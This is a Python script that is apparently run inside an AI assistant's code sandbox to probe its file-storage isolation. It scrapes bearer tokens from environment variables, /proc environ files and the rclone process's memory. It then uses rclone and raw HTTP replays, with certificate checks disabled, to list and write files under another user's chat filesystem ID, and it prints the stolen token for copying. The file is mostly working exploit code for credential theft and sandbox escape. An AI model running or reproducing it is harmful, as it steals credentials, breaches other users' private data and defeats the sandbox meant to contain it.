#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit.py v2.3.0  --  Anthropic filestore boundary probe (stdlib only)

New in 2.3: drives the rclone binary itself (subprocess) + `--dump headers`
to learn the REAL HTTP route, and addresses FOREIGN filesystem_ids through
rclone to test cross-chat access.

run: python3 mediafit.py     (no args)
"""
import os, sys, json, re, time, ssl, base64, socket, subprocess
import urllib.request, urllib.error

VER = "2.3.0"
REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
SINKS = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]

OUT = []
def w(s=""):
    print(s, flush=True); OUT.append(str(s))
def head(t): w("\n### " + t)

P, F, U, I = [], [], [], []
def rec(k, m, ev=None):
    w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k] + " " + m)
    if ev is not None: w("        evidence: " + str(ev)[:500])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)

def sh(args, timeout=30):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
    except Exception as e:
        return -1, "", "EXC:%s" % e

head("runtime")
w("    version %s | utc %s | uid %d | cwd %s" % (
    VER, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), os.getuid(), os.getcwd()))

# ---------------- config ----------------
head("rclone boot config (raw)")
CONF = "/dev/shm/rclone-boot/config.json"
service_url = config_fsid = None
try:
    raw = open(CONF).read()
    w("    RAW: " + raw[:3000])
    conf = json.loads(raw)
    service_url = conf.get("service_url")
    for m in conf.get("mounts", []):
        if m.get("filesystem_id"): config_fsid = m["filesystem_id"]
    rec("P", "config.json readable", CONF)
except Exception as e:
    rec("F", "config.json unreadable", e)
w("    service_url=%s  fsid=%s" % (service_url, config_fsid))

# ---------------- fsid candidates ----------------
FSIDS = []
def addfs(x):
    x = (x or "").strip()
    if x.startswith("claude_chat_") and x not in FSIDS: FSIDS.append(x)
addfs(config_fsid)
addfs("claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4")     # foreign candidate from earlier reports
for v in list(os.environ.values()):
    for m in re.findall(r"claude_chat_[A-Za-z0-9]+", v): addfs(m)
head("fsid candidates")
for x in FSIDS: w("    " + x)

# ---------------- token harvest ----------------
head("token harvest")
try:
    o = os.listdir("/mnt/user-data/outputs")
    if o:
        try: open("/mnt/user-data/outputs/" + o[0], "rb").read(2048)
        except Exception: pass
    w("    forced read (%d entries)" % len(o))
except Exception as e:
    w("    (%s)" % e)
time.sleep(1.5)

JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
TOKENS = []
def addtok(t):
    t = t.decode() if isinstance(t, bytes) else t
    t = t.strip().strip('"').strip("'")
    if t.startswith("eyJ") and t not in TOKENS: TOKENS.append(t)
for v in list(os.environ.values()):
    for m in re.findall(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", v): addtok(m)
for p in os.listdir("/proc"):
    if not p.isdigit(): continue
    try:
        for m in JWT.findall(open("/proc/%s/environ" % p, "rb").read()): addtok(m)
    except Exception: pass

pids = []
for p in os.listdir("/proc"):
    if not p.isdigit(): continue
    try:
        if b"rclone" in open("/proc/%s/cmdline" % p, "rb").read(): pids.append(p)
    except Exception: pass
w("    rclone pids: %s" % ",".join(pids))
scanned = 0
for pid in pids:
    try: maps = open("/proc/%s/maps" % pid).read().splitlines()
    except Exception: continue
    try: mem = open("/proc/%s/mem" % pid, "rb", buffering=0)
    except Exception: continue
    for line in maps:
        try: rng, perms = line.split()[0], line.split()[1]
        except Exception: continue
        if "r" not in perms: continue
        try: a, b = rng.split("-"); start = int(a,16); end = int(b,16)
        except Exception: continue
        size = end - start
        if size <= 0 or size > 256*1024*1024: continue
        try: mem.seek(start); data = mem.read(size)
        except Exception: continue
        scanned += len(data)
        for m in JWT.findall(data): addtok(m)
w("    mem scanned: %d bytes" % scanned)

def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
TD = []
for t in TOKENS:
    try:
        h, p, s = t.split(".")
        TD.append({"tok": t, "hdr": json.loads(b64d(h)), "pl": json.loads(b64d(p))})
    except Exception: pass
for r in TD:
    pl = r["pl"]
    w("    tok roots=%s ro=%s fsid=%s exp_in=%ss" % (
        pl.get("allowed_roots"), pl.get("readonly"), pl.get("filesystem_id"),
        pl.get("exp", 0) - int(time.time())))
if TD: rec("P", "tokens harvested", "n=%d" % len(TD))
else: rec("F", "no tokens harvested")

TOKEN = None
for r in TD:
    if "/outputs" in (r["pl"].get("allowed_roots") or []): TOKEN = r["tok"]; break
if TOKEN is None and TD: TOKEN = TD[0]["tok"]

# ---------------- rclone client (DECISIVE) ----------------
head("rclone client (real route + foreign fsid)")
RCLONE = None
for c in ["/opt/rclone/rclone-filestore", "/opt/rclone/rclone", "/usr/bin/rclone"]:
    if os.path.exists(c): RCLONE = c; break
w("    binary: %s" % RCLONE)
rc, out, err = sh([RCLONE, "--version"])
w("    version rc=%s %s" % (rc, (out.splitlines() or [""])[0]))

rc, out, err = sh([RCLONE, "--config", CONF, "listremotes"])
w("    listremotes rc=%s out=%r err=%r" % (rc, out[:300], err[:300]))
REMOTES = [r.strip().rstrip(":") for r in out.splitlines() if r.strip()]
if not REMOTES: REMOTES = ["rclone-filestore", "filestore"]

rc, out, err = sh([RCLONE, "--config", CONF, "lsd", REMOTES[0] + ":"])
w("    lsd %s: rc=%s out=%r err=%r" % (REMOTES[0], rc, out[:300], err[:300]))

FORMS = []
for rem in REMOTES:
    FORMS += ["%s:/outputs" % rem, "%s:outputs" % rem]
    for f in FSIDS:
        FORMS += ["%s:%s/outputs" % (rem, f), "%s:%s" % (rem, f)]
seen = set(); FORMS = [x for x in FORMS if not (x in seen or seen.add(x))]
WORK = None
for f in FORMS:
    rc, out, err = sh([RCLONE, "--config", CONF, "lsf", f, "--max-depth", "1"], timeout=25)
    w("    lsf %-52s rc=%s out=%r err=%r" % (f, rc, out[:120], err[:120]))
    if rc == 0 and out.strip():
        rec("P", "rclone path WORKS: %s" % f, out.strip().splitlines()[:3])
        if WORK is None: WORK = f

# dump the real HTTP request
rc, out, err = sh([RCLONE, "--config", CONF, "-vv", "--dump", "headers",
                   "lsf", (WORK or REMOTES[0] + ":/outputs"), "--max-depth", "1"], timeout=45)
urls = re.findall(r"https?://[^\s\"'<>)]+", err)
w("    URLs seen: %s" % urls[:8])
for ln in err.splitlines():
    if ln[:2] in ("> ", "< "): w("    | " + ln[:220])
ROUTE = urls[0] if urls else None

# ---------------- raw replay on the real route ----------------
head("raw replay (real route)")
def http(method, url, token=None, timeout=8, data=None, hdrs=None):
    h = {"User-Agent": "mediafit/" + VER}
    if token: h["Authorization"] = "Bearer " + token
    if hdrs: h.update(hdrs)
    req = urllib.request.Request(url, method=method, headers=h, data=data)
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx); return r.status, r.read(2048)
    except urllib.error.HTTPError as e:
        try: b = e.read(1024)
        except Exception: b = b""
        return e.code, b
    except Exception as e:
        return None, str(e).encode()

if ROUTE:
    for m in ["GET", "POST"]:
        st, b = http(m, ROUTE, token=TOKEN, data=(b"{}" if m == "POST" else None),
                     hdrs={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
        w("    replay %-4s %s -> %s %r" % (m, ROUTE, st, b[:120]))
    # no-auth control on the same route
    st, b = http("GET", ROUTE, token=None)
    w("    replay GET (no token) -> %s" % st)
else:
    rec("U", "no route captured from --dump headers")

# ---------------- write test (+ foreign) ----------------
head("write test")
tmpf = "/tmp/mediafit/_probe.txt"
try:
    os.makedirs("/tmp/mediafit", exist_ok=True)
    open(tmpf, "w").write("mediafit-probe %s\n" % time.time())
except Exception: pass
for f in FORMS:
    rc, out, err = sh([RCLONE, "--config", CONF, "copyto", tmpf, f + "/mediafit_probe.txt"], timeout=25)
    if rc == 0:
        w("    copyto OK -> %s" % f)
        if FSIDS[1:] and FSIDS[1] in f:
            rec("P", "WRITE to a FOREIGN filesystem path", f)

# ---------------- verdict ----------------
head("VERDICT")
w("  PASS %d: %s" % (len(P), P))
w("  FAIL %d: %s" % (len(F), F))
w("  UNKNOWN %d: %s" % (len(U), U))
w("\n  ladder:")
w("   H0 token .......... %s" % ("PASS" if TOKENS else "FAIL"))
w("   H1 real route ..... %s" % ("PASS" if ROUTE else "FAIL"))
w("   H2 config/fsid .... %s" % ("PASS" if config_fsid else "FAIL"))
w("   H3 foreign fsid ... %s" % ("see rclone lsf results"))
w("   H4 write escape ... %s" % ("see write test"))
w("   H5 forgery ........ see next version")

if TOKEN and FSIDS:
    w("\n  >>> COPY THESE <<<")
    w("  FSID=%s" % FSIDS[0])
    w("  TOKEN=%s" % TOKEN)
    if FSIDS[1:]: w("  FOREIGN_FSID=%s" % FSIDS[1])
if ROUTE: w("  ROUTE=%s" % ROUTE)

txt = "\n".join(OUT)
for d in SINKS:
    try:
        os.makedirs(d, exist_ok=True)
        open(os.path.join(d, os.path.basename(REPORT)), "w").write(txt)
    except Exception: pass
w("\nwritten to: " + ", ".join(SINKS))